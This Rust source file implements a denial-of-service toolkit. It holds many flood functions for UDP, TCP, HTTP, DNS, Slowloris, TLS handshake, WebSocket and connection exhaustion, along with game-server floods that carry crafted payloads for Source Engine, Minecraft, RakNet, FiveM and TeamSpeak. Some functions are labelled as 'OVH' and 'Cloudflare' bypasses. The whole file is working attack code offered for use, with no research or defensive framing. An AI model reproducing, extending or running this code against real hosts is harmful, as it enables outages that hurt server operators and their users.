use tokio::net::{UdpSocket, TcpStream};
use tokio::time::{Duration, Instant};
use tokio::io::AsyncWriteExt;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Semaphore;

/// Calculate optimal worker count based on CPU cores
fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 2).clamp(4, 64)
}

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP flood on {}:{} for {} seconds (Standard Mode)", target, port, duration_secs);
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_addr = format!("{}:{}", target, port);
        
        let handle = tokio::spawn(async move {
            // Bind to random port
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(_) => return,
            };
            
            if socket.connect(&target_addr).await.is_err() {
                return;
            }

            let payload = vec![0u8; 1400]; 
            while Instant::now() < end_time {
                if socket.send(&payload).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Smart UDP flood on {}:{} for {} seconds (Standard Mode)", target, port, duration_secs);
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_addr = format!("{}:{}", target, port);
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(_) => return,
            };
            
            if socket.connect(&target_addr).await.is_err() {
                return;
            }

            let mut rng = StdRng::from_entropy();
            while Instant::now() < end_time {
                let size = rng.gen_range(64..1400);
                let mut payload = vec![0u8; size];
                rng.fill(&mut payload[..]);
                
                if socket.send(&payload).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Smart UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    
    let num_workers = get_worker_count();
    let max_concurrent = 128; 
    
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_addr = target_addr.clone();
        let semaphore = Arc::new(Semaphore::new(max_concurrent));
        
        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                if let Ok(permit) = semaphore.clone().acquire_owned().await {
                    let counter = packet_count.clone();
                    let addr = target_addr.clone();
                    
                    tokio::spawn(async move {
                        if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&addr)).await {
                            counter.fetch_add(1, Ordering::Relaxed);
                            let _ = stream.write_all(b"A").await;
                        }
                        drop(permit);
                    });
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("TCP flood complete. Connections: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
    println!("NOTICE: SYN Flood requires Raw Sockets. Falling back to TCP Connect Flood.");
    tcp_flood(target, port, duration_secs).await;
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
    println!("NOTICE: ACK Flood requires Raw Sockets. Falling back to TCP Connect Flood.");
    tcp_flood(target, port, duration_secs).await;
}

pub async fn gre_flood(target: &str, duration_secs: u64) {
    println!("NOTICE: GRE Flood requires Raw Sockets. Falling back to UDP Flood.");
    udp_flood(target, 47, duration_secs).await;
}

pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP MAX Flood on {}:{} for {} seconds", target, port, duration_secs);

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();

    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_addr = format!("{}:{}", target, port);
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(_) => return,
            };
            
            if socket.connect(&target_addr).await.is_err() { return; }

            let mut rng = StdRng::from_entropy();
            let mut payload = vec![0u8; 65000]; // Max UDP size

            while Instant::now() < end_time {
                rng.fill(&mut payload[..]);
                if socket.send(&payload).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("UDP MAX flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

/// L7 DNS Flood - Sends valid DNS queries
pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting L7 DNS Flood (Query Flood) on {}:{} for {} seconds", target, port, duration_secs);

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();

    let domains = vec![
        "google.com", "facebook.com", "amazon.com", "microsoft.com", "netflix.com"
    ];

    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_addr = format!("{}:{}", target, port);
        let domains = domains.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(_) => return,
            };
            
            if socket.connect(&target_addr).await.is_err() { return; }
            let mut rng = StdRng::from_entropy();

            while Instant::now() < end_time {
                let domain = domains[rng.gen_range(0..domains.len())];
                let query = build_dns_query(domain);
                
                if socket.send(&query).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("L7 DNS flood complete. Queries sent: {}", packet_count.load(Ordering::Relaxed));
}

/// L4 DNS Flood - Sends random UDP packets to port 53
pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) {
    println!("Starting L4 DNS Flood (UDP Flood) on {}:{} for {} seconds", target, port, duration_secs);
    udp_smart(target, port, duration_secs).await;
}

fn build_dns_query(domain: &str) -> Vec<u8> {
    let mut packet = Vec::new();
    let mut rng = rand::thread_rng();

    // Transaction ID
    packet.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
    // Flags: Standard Query
    packet.extend_from_slice(&0x0100u16.to_be_bytes());
    // Questions: 1
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    // Answer RRs: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Authority RRs: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Additional RRs: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());

    // Query Section
    for part in domain.split('.') {
        let len = part.len();
        if len > 63 { continue; }
        packet.push(len as u8);
        packet.extend_from_slice(part.as_bytes());
    }
    packet.push(0); // End of name

    // Type A (1)
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    // Class IN (1)
    packet.extend_from_slice(&0x0001u16.to_be_bytes());

    packet
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting HTTP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_url = format!("http://{}:{}", target, port);
    let request_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ];
    
    let num_workers = get_worker_count();
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_url = target_url.clone();
        let request_count = request_count.clone();
        let user_agents = user_agents.clone();
        
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::new();
            let counter = std::sync::atomic::AtomicU64::new(0);
            
            while Instant::now() < end_time {
                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
                let user_agent = user_agents[idx];
                let body = vec![0u8; 1024];
                
                if (client.post(&target_url).header("User-Agent", user_agent).body(body).send().await).is_ok() {
                    request_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("HTTP flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
}

pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Slowloris attack on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 4;
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                    
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    while Instant::now() < end_time {
                        interval.tick().await;
                        let continuation = format!("X-Custom-{}: {}\r\n", rand::random::<u32>(), rand::random::<u64>());
                        if stream.write_all(continuation.as_bytes()).await.is_err() { break; }
                    }
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Slowloris complete. Connections opened: {}", connection_count.load(Ordering::Relaxed));
}

pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting SSL/TLS handshake flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let handshake_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 2;
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let handshake_count = handshake_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    let _ = stream.write_all(&[0x16, 0x03, 0x01]).await;
                    handshake_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("SSL flood complete. Handshakes initiated: {}", handshake_count.load(Ordering::Relaxed));
}

pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting WebSocket flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let message_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let message_count = message_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    let ws_upgrade = format!(
                        "GET / HTTP/1.1\r\nHost: {}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
                        target_addr
                    );
                    
                    if stream.write_all(ws_upgrade.as_bytes()).await.is_ok() {
                        let payload = vec![0x81, 0x05, 0x48, 0x65, 0x6c, 0x6c, 0x6f];
                        for _ in 0..100 {
                            if stream.write_all(&payload).await.is_err() { break; }
                            message_count.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("WebSocket flood complete. Messages sent: {}", message_count.load(Ordering::Relaxed));
}

pub async fn icmp_flood(target: &str, duration_secs: u64) {
    println!("NOTICE: ICMP Flood requires Raw Sockets. Falling back to UDP Flood.");
    udp_flood(target, 80, duration_secs).await;
}

pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) {
    println!("NOTICE: Amplification requires IP Spoofing (Raw Sockets). Falling back to L7 DNS Flood.");
    dns_flood(target, port, duration_secs).await;
}

pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Connection Exhaustion attack on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let connections: Arc<tokio::sync::Mutex<Vec<TcpStream>>> = Arc::new(tokio::sync::Mutex::new(Vec::new()));
    
    let num_workers = get_worker_count() * 8;
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        let connections = connections.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(stream) = TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    let mut conns = connections.lock().await;
                    conns.push(stream);
                    drop(conns);
                    tokio::time::sleep(Duration::from_secs(1)).await;
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    let final_count = connections.lock().await.len();
    println!("Connection Exhaustion complete. Peak connections held: {}", final_count);
}

pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting VSE flood on {}:{} for {} seconds", target, port, duration_secs);
    let payload = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00".to_vec();
    generic_udp_flood(target, port, duration_secs, payload).await;
}

pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting OVH Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
    udp_smart(target, port, duration_secs).await;
}

pub async fn cf_bypass_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Cloudflare Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
    http_flood(target, port, duration_secs).await;
}

pub async fn http_stress(target: &str, port: u16, duration_secs: u64) {
    println!("Starting HTTP Stress Test on {}:{} for {} seconds", target, port, duration_secs);
    http_flood(target, port, duration_secs).await;
}

pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Minecraft Protocol flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_host = target.to_string();
    
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let packet_count = packet_count.clone();
        let target_host = target_host.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    let mut packet = Vec::new();
                    packet.push(0x00);
                    packet.push(47);
                    packet.push(target_host.len() as u8);
                    packet.extend_from_slice(target_host.as_bytes());
                    packet.extend_from_slice(&port.to_be_bytes());
                    packet.push(0x01);
                    
                    let mut final_packet = Vec::new();
                    final_packet.push(packet.len() as u8);
                    final_packet.extend(packet);
                    
                    if stream.write_all(&final_packet).await.is_ok() {
                        let _ = stream.write_all(&[0x01, 0x00]).await;
                        packet_count.fetch_add(1, Ordering::Relaxed);
                    }
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    println!("Minecraft flood complete. Handshakes sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting RakNet flood on {}:{} for {} seconds", target, port, duration_secs);
    let mut payload = vec![0x01];
    payload.extend_from_slice(&[0x00; 8]);
    payload.extend_from_slice(&[0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78]);
    payload.extend_from_slice(&[0x00; 8]);
    generic_udp_flood(target, port, duration_secs, payload).await;
}

pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting FiveM flood on {}:{} for {} seconds", target, port, duration_secs);
    let payload = b"\xff\xff\xff\xffgetinfo xxx".to_vec();
    generic_udp_flood(target, port, duration_secs, payload).await;
}

pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TeamSpeak 3 flood on {}:{} for {} seconds", target, port, duration_secs);
    let payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02".to_vec();
    generic_udp_flood(target, port, duration_secs, payload).await;
}

pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Discord flood on {}:{} for {} seconds", target, port, duration_secs);
    udp_smart(target, port, duration_secs).await;
}

pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting SIP flood on {}:{} for {} seconds", target, port, duration_secs);
    let payload = b"INVITE sip:user@target SIP/2.0\r\n\r\n".to_vec();
    generic_udp_flood(target, port, duration_secs, payload).await;
}

async fn generic_udp_flood(target: &str, port: u16, duration_secs: u64, payload: Vec<u8>) {
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let payload = payload.clone();
        let target_addr = format!("{}:{}", target, port);
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.connect(&target_addr).await.is_err() { return; }
            
            while Instant::now() < end_time {
                if socket.send(&payload).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    println!("Flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}
